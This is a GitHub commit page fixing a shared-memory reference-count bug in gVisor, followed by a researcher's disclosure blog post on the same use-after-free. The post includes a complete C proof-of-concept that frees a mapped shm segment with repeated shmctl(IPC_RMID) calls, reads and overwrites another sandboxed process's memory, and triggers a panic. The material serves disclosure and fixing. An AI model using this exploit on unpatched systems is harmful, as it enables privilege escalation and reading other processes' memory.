=== Content from github.com_31c3e737_20250124_151301.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fgvisor%2Fcommit%2F0e277a39c8b6f905e289b75e8ad0594e6b3562ca)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fgvisor%2Fcommit%2F0e277a39c8b6f905e289b75e8ad0594e6b3562ca)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=google%2Fgvisor)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[google](/google)
/
**[gvisor](/google/gvisor)**
Public

* [Notifications](/login?return_to=%2Fgoogle%2Fgvisor) You must be signed in to change notification settings
* [Fork
  1.3k](/login?return_to=%2Fgoogle%2Fgvisor)
* [Star
   16k](/login?return_to=%2Fgoogle%2Fgvisor)

* [Code](/google/gvisor)
* [Issues
  377](/google/gvisor/issues)
* [Pull requests
  51](/google/gvisor/pulls)
* [Actions](/google/gvisor/actions)
* [Projects
  0](/google/gvisor/projects)
* [Security](/google/gvisor/security)
* [Insights](/google/gvisor/pulse)

Additional navigation options

* [Code](/google/gvisor)
* [Issues](/google/gvisor/issues)
* [Pull requests](/google/gvisor/pulls)
* [Actions](/google/gvisor/actions)
* [Projects](/google/gvisor/projects)
* [Security](/google/gvisor/security)
* [Insights](/google/gvisor/pulse)

## Commit

[Permalink](/google/gvisor/commit/0e277a39c8b6f905e289b75e8ad0594e6b3562ca)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Prevent premature destruction of shm segments.

[Browse files](/google/gvisor/tree/0e277a39c8b6f905e289b75e8ad0594e6b3562ca)
Browse the repository at this point in the history

```
Shm segments can be marked for lazy destruction via shmctl(IPC_RMID),
which destroys a segment once it is no longer attached to any
processes. We were unconditionally decrementing the segment refcount
on shmctl(IPC_RMID) which allowed a user to force a segment to be
destroyed by repeatedly calling shmctl(IPC_RMID), with outstanding
memory maps to the segment.

This is problematic because the memory released by a segment destroyed
this way can be reused by a different process while remaining
accessible by the process with outstanding maps to the segment.

PiperOrigin-RevId: 219713660
Change-Id: I443ab838322b4fb418ed87b2722c3413ead21845
```

* Loading branch information

[![@mrahatm](https://avatars.githubusercontent.com/u/46939889?s=40&v=4)](/mrahatm) [![@shentubot](https://avatars.githubusercontent.com/u/38232937?s=40&v=4)](/shentubot)

[mrahatm](/google/gvisor/commits?author=mrahatm "View all commits by mrahatm")
authored and
[shentubot](/google/gvisor/commits?author=shentubot "View all commits by shentubot")
committed
Nov 1, 2018

1 parent
[b23cd33](/google/gvisor/commit/b23cd33682a9a8bd727fa45b8424eb55d91c3086)

commit 0e277a3

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**12 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* pkg/sentry

  + kernel/shm

    - pkg/sentry/kernel/shm/shm.go
      [shm.go](#diff-d7034b43fa5e35953adf38eefa063289282fcfa315066bb2533432f7134e2ab7)
  + syscalls/linux

    - pkg/sentry/syscalls/linux/sys\_shm.go
      [sys\_shm.go](#diff-1646657d0e84da2646fbe6e1752852506c3b9fdd9632a3fc0e4054616211a0f5)

## There are no files selected for viewing

13 changes: 11 additions & 2 deletions

13
[pkg/sentry/kernel/shm/shm.go](#diff-d7034b43fa5e35953adf38eefa063289282fcfa315066bb2533432f7134e2ab7 "pkg/sentry/kernel/shm/shm.go")

Show comments

[View file](/google/gvisor/blob/0e277a39c8b6f905e289b75e8ad0594e6b3562ca/pkg/sentry/kernel/shm/shm.go)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -575,10 +575,19 @@ func (s \*Shm) destroy() { |
|  |  | func (s \*Shm) MarkDestroyed() { |
|  |  | s.mu.Lock() |
|  |  | defer s.mu.Unlock() |
|  |  |  |
|  |  | // Prevent the segment from being found in the registry. |
|  |  | s.key = linux.IPC\_PRIVATE |
|  |  | s.pendingDestruction = true |
|  |  | s.DecRef() |
|  |  |  |
|  |  | // Only drop the segment's self-reference once, when destruction is |
|  |  | // requested. Otherwise, repeated calls shmctl(IPC\_RMID) would force a |
|  |  | // segment to be destroyed prematurely, potentially with active maps to the |
|  |  | // segment's address range. Remaining references are dropped when the |
|  |  | // segment is detached or unmaped. |
|  |  | if !s.pendingDestruction { |
|  |  | s.pendingDestruction = true |
|  |  | s.DecRef() |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // checkOwnership verifies whether a segment may be accessed by ctx as an |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[pkg/sentry/syscalls/linux/sys\_shm.go](#diff-1646657d0e84da2646fbe6e1752852506c3b9fdd9632a3fc0e4054616211a0f5 "pkg/sentry/syscalls/linux/sys_shm.go")

Show comments

[View file](/google/gvisor/blob/0e277a39c8b6f905e289b75e8ad0594e6b3562ca/pkg/sentry/syscalls/linux/sys_shm.go)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -144,7 +144,7 @@ func Shmctl(t \*kernel.Task, args arch.SyscallArguments) (uintptr, \*kernel.Syscal |
|  |  | return 0, nil, nil |
|  |  |  |
|  |  | case linux.SHM\_LOCK, linux.SHM\_UNLOCK: |
|  |  | // We currently do not support memmory locking anywhere. |
|  |  | // We currently do not support memory locking anywhere. |
|  |  | // mlock(2)/munlock(2) are currently stubbed out as no-ops so do the |
|  |  | // same here. |
|  |  | t.Kernel().EmitUnimplementedEvent(t) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0e277a3`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fgvisor%2Fcommit%2F0e277a39c8b6f905e289b75e8ad0594e6b3562ca) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from justi.cz_7fd4ebb1_20250124_151301.html ===

[Max Justicz](/)

# Privilege Escalation in gVisor, Google's Container Sandbox

Nov 14, 2018

tl;dr [gVisor](https://github.com/google/gvisor) is Google’s sandboxing technology for containers running less-than-fully-trusted code. It’s a Golang reimplementation of the Linux kernel that runs in userspace, intercepting container syscalls and limiting what touches the host kernel directly. I found an issue with gVisor’s shared memory implementation that allowed unprivileged processes in the sandbox to read and write the memory of other, more highly privileged processes in the sandbox, including those running as root.

*[edit: Please note that this is not a sandbox escape; gaining root within gVisor does not give you access to the host machine. I encourage you to check out the [gVisor README](https://github.com/google/gvisor) for more details!]*

Here’s a video of me running a proof-of-concept that reads and overwrites some memory in an unrelated process (code at the end of the post):

## Vulnerability

### Mapped-after-free

gVisor uses reference counting for various parts of its internal memory management, and the bug allows us to lower the reference count of the “platform” memory backing a [`shmget` shared memory region,](https://users.cs.cf.ac.uk/Dave.Marshall/C/node27.html) even when we still have a mapping to it in our process’s virtual address space. The backing memory is then reclaimed and handed to another (potentially more privileged) process, where it can be used for something else. The bug is basically a use-after-free.

The problem stems from this code in `sys_shm.go`, which implements the `shmctl` syscall:

```
func Shmctl(t *kernel.Task, args arch.SyscallArguments) (uintptr, *kernel.SyscallControl, error) {
  id := args[0].Int()
  cmd := args[1].Int()
  buf := args[2].Pointer()
...
  switch cmd {
...
  case linux.IPC_RMID:
    segment.MarkDestroyed()
    return 0, nil, nil
```

`segment.MarkDestroyed()` unconditionally decreases the reference count of the shared memory object, which eventually decreases the reference count of the platform memory range itself in `shm.go`:

```
func (s *Shm) destroy() {
  s.registry.remove(s)
  s.p.Memory().DecRef(s.fr)
}

func (s *Shm) MarkDestroyed() {
  s.mu.Lock()
  defer s.mu.Unlock()
  // Prevent the segment from being found in the registry.
  s.key = linux.IPC_PRIVATE
  s.pendingDestruction = true
  // destroy() above will get called when the reference count goes negative
  s.DecRef()
}
```

So if the platform memory region in the `s.fr` range has a reference count of `1`, and we call `shmctl(shmid, IPC_RMID, NULL)` until we trigger the destruction of the `Shm` object, that backing memory can be reclaimed by the kernel for use by other processes.

The platform memory’s reference count is initialized to `1` when we initially create our shared memory object with `shmget()`, but it gets incremented to `2` when the memory is accessed and page-faulted in. So if you read or write to the mapped shared memory region before triggering the `DecRef()` bug, things become harder to exploit.

Here’s the proof-of-concept I put together for the video above, with comments explaining how it works:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/shm.h>
#include <unistd.h>

#define SHMKEY 1234567

#define SHMSIZE ((size_t) 4096)

int main()
{
  // Fork off a process that allocates a bunch of memory containing the string
  // 'OOPS', and that will exit if it ever finds an 'A' byte in that string
  // (indicating that the memory has been overwritten by another process)
  if (fork() == 0) {
    sleep(1);
    execl("/usr/bin/python3", "python", "-c", "x = 'OOPS'\n"
                                              "while True:\n\t"
                                                "x += 'OOPS'\n\t"
                                                "if 'A' in x:\n\t\t"
                                                  "print('\\n\\n***Other process: memory was overwritten***')\n\t\t"
                                                  "exit(0)\n", NULL);
    return 0;
  }

  // Create a readable, writable shared memory region
  int shmid = shmget(SHMKEY, SHMSIZE, IPC_CREAT | 0600);

  // Map that shared memory into our virtual address space
  volatile unsigned char *shmm = shmat(shmid, NULL, 0);

  printf("shmm addr: %p\n", shmm);
  printf("Decreasing refcount\n");

  // Trigger our bug by releasing the platform memory backing the shared memory
  shmctl(shmid, IPC_RMID, NULL);
  shmctl(shmid, IPC_RMID, NULL);

  // Give the Python process some time to use up memory
  sleep(2);

  printf("Allocation from another process:\n");

  // Print out some bytes from the page, which has probably been allocated to
  // the Python process's big string
  for (size_t i = 0; i < 200; i++) {
    if (i % 20 == 0) {
      printf("\n");
    }
    if (shmm[i] != 0) printf("\x1B[32m");
    printf("%02X ", shmm[i]);
    if (shmm[i] != 0) printf("\x1B[0m");
    fflush(stdout);
  }

  // Demonstrate that we can overwrite the other process's memory. The other
  // process should exit once it detects that we've overwritten part of the
  // string with 0x41
  memset((char *)shmm, 0x41, SHMSIZE);

  // Sleep for a couple seconds so that we don't instantly panic
  sleep(2);

  // When the process exits, the kernel will attempt to DecRef an object whose
  // refcount is already negative, so it panics.
  printf("\nTime to panic...\n");

  return 0;
}
```
### Conclusion

gVisor is a well-written but incredibly ambitious project; reimplementing the Linux kernel is hard. I’ve been thinking about some ways that one could detect and mitigate against this class of bug. Perhaps when a memory region is `DecRef()`ed to `0`, the kernel could check that it doesn’t exist in any process’s virtual address space. I’m not sure if that would be too expensive.

## Contact

* Max Justicz
* max@justi.cz
* [mastodon.mit.edu/@maxj](https://mastodon.mit.edu/%40maxj)

Will I abandon this blog after only a few posts? Stay tuned and find out!


